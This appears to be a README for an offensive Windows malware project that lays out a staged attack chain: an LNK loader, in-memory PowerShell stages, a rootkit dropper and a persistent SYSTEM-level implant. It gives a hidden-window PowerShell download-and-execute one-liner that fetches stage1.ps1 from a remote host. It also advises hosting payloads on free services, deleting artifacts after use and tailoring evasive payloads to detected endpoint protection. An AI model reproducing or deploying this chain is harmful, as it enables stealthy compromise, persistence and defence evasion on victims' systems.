Host this entire path in the attacker's repository. Or you can host them on a free file-hosting site like Heroku or Netlify or your own VPS. 

The LNK loader simply executes the first stage. 
`powershell.exe -WindowStyle Hidden -Command IEX(iwr -UseBasicParsing http://192.168.1.26/stage1.ps1)`

If you already have shell access, you can simply copy and paste the one-liner to start the chain.

# Attack chain

1. stage1.ps1 auto-enumerates privileges in memory as a benign sysadmin script, if administrative...
2. Downloads and parses stage2.ps1 in memory
3. Runs the rootkit installer and payload
4. Downloads and adds the registry configurations as a batch script and then deletes it
5. Executes the payload (if the target reboots, a copy of the implant restarts with SYSTEM privileges)

These chains can be extended by enumerating vendor solutions (by querying for endpoint protection agent instlalations) between them to download evasive payloads targeting specific solutions


# Compile the rootkit dropper

Rename the executable to stage3.exe (We don't host compiled malware on Github)

# Compile the implant

Rename the executable to stage4.exe
